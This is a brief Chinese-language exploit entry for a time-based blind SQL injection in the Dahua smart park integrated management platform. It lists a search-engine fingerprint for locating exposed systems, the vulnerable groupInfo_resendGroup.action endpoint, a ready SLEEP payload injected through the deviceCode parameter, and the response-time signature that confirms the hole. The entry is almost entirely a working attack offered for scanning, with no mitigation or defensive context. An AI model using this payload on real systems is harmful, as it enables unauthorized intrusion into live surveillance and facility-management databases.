# 大华智慧园区综合管理平台-wpmsgroupinfo-resendgroupsql注入

大华 ｜ SQL注入 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /portal/groupInfo/groupInfo_resendGroup.action HTTP/1.1`

**Payload**
```
deviceCode=-100{{url_encode("%\' AND (SELECT 9982 FROM (SELECT(SLEEP(3)))VazO)-- -")}}
```
- **响应特征**：200 响应时间>=3s